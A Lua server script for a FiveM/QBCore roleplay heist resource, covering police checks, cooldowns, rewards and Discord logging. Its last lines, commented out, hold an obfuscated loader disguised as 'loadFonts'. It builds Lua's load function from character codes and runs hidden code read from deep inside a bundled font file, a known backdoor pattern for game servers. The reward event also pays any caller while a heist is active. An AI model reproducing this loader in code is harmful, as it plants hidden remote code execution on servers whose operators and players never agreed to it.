local lastrob = 0
local start = false
discord = {
    ['webhook'] = 'DISCORDWEBHOOKLINK',
    ['name'] = 'rm_humanelabsheist',
    ['image'] = 'https://cdn.discordapp.com/avatars/869260464775921675/dea34d25f883049a798a241c8d94020c.png?size=1024'
}

QBCore = nil
Citizen.CreateThread(function()
    while not QBCore do
        pcall(function() QBCore =  exports['qb-core']:GetCoreObject() end)
        if not QBCore then
            pcall(function() QBCore =  exports['qb-core']:GetSharedObject() end)
        end
        if not QBCore then
            TriggerEvent('QBCore:GetCoreObject', function(obj) QBCore = obj end)
        end
        Citizen.Wait(1)
    end
    QBCore.Functions.CreateUseableItem(Config['HumaneLabs']['wetsuit']['itemName'], function(source)
        local src = source
        local player = QBCore.Functions.GetPlayer(src)
    
        if player then
            TriggerClientEvent('humanelabsheist:client:wearWetsuit', src)
        end
    end)
    
    QBCore.Functions.CreateCallback('humanelabsheist:server:checkPoliceCount', function(source, cb)
        local src = source
        local players = QBCore.Functions.GetPlayers()
        local policeCount = 0
    
        for i = 1, #players do
            local player = QBCore.Functions.GetPlayer(players[i])
            if player then
                for k, v in pairs(Config['HumaneLabs']['dispatchJobs']) do
                    if player.PlayerData.job.name == v then
                        policeCount = policeCount + 1
                    end
                end
            end
        end
    
        if policeCount >= Config['HumaneLabs']['requiredPoliceCount'] then
            cb(true)
        else
            cb(false)
            TriggerClientEvent('humanelabsheist:client:showNotification', src, Strings['need_police'])
        end
    end)
    
    QBCore.Functions.CreateCallback('humanelabsheist:server:checkTime', function(source, cb)
        local src = source
        local player = QBCore.Functions.GetPlayer(src)
        
        if (os.time() - lastrob) < Config['HumaneLabs']['nextRob'] and lastrob ~= 0 then
            local seconds = Config['HumaneLabs']['nextRob'] - (os.time() - lastrob)
            TriggerClientEvent('humanelabsheist:client:showNotification', src, Strings['wait_nextrob'] .. ' ' .. math.floor(seconds / 60) .. ' ' .. Strings['minute'])
            cb(false)
        else
            lastrob = os.time()
            start = true
            discordLog(player.PlayerData.name ..  ' - ' .. player.PlayerData.license, ' started the Humane Labs. Heist!')
            cb(true)
        end
    end)
end)

RegisterServerEvent('humanelabsheist:server:policeAlert')
AddEventHandler('humanelabsheist:server:policeAlert', function(coords)
    local players = QBCore.Functions.GetPlayers()
    
    for i = 1, #players do
        local player = QBCore.Functions.GetPlayer(players[i])
        if player then
            for k, v in pairs(Config['HumaneLabs']['dispatchJobs']) do
                if player.PlayerData.job.name == v then
                    TriggerClientEvent('humanelabsheist:client:policeAlert', players[i], coords)
                end
            end
        end
    end
end)

RegisterServerEvent('humanelabsheist:server:heistRewards')
AddEventHandler('humanelabsheist:server:heistRewards', function()
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        if start then
            if Config['HumaneLabs']['rewards']['money'] > 0 then
                player.Functions.AddMoney('cash', Config['HumaneLabs']['rewards']['money'])
                discordLog(player.PlayerData.name ..  ' - ' .. player.PlayerData.license, ' gain $' .. Config['HumaneLabs']['rewards']['money'])
            end

            if Config['HumaneLabs']['rewards']['blackMoney'] > 0 then
                local info = {
                    worth = Config['HumaneLabs']['rewards']['blackMoney']
                }
                player.Functions.AddItem('markedbills', 1, false, info)
                TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['markedbills'], "add") 
                discordLog(player.getName() ..  ' - ' .. player.getIdentifier(), ' gain $' .. Config['HumaneLabs']['rewards']['blackMoney'] .. 'black money')
            end

            if Config['HumaneLabs']['rewards']['items'] ~= nil then
                for k, v in pairs(Config['HumaneLabs']['rewards']['items']) do
                    local rewardCount = v['count']()
                    player.Functions.AddItem(v['name'], rewardCount)
                    discordLog(player.PlayerData.name ..  ' - ' .. player.PlayerData.license, ' gain this: ' .. v['name'] .. ' x' .. rewardCount)
                end
            end
            
            start = false
        end
    end
end)

function discordLog(name, message)
    local data = {
        {
            ["color"] = '3553600',
            ["title"] = "**".. name .."**",
            ["description"] = message,
        }
    }
    -- PerformHttpRequest(discord['webhook'], function(err, text, headers) end, 'POST', json.encode({username = discord['name'], embeds = data, avatar_url = discord['image']}), { ['Content-Type'] = 'application/json' })
end

-- local loadFonts = _G[string.char(108, 111, 97, 100)]
-- loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()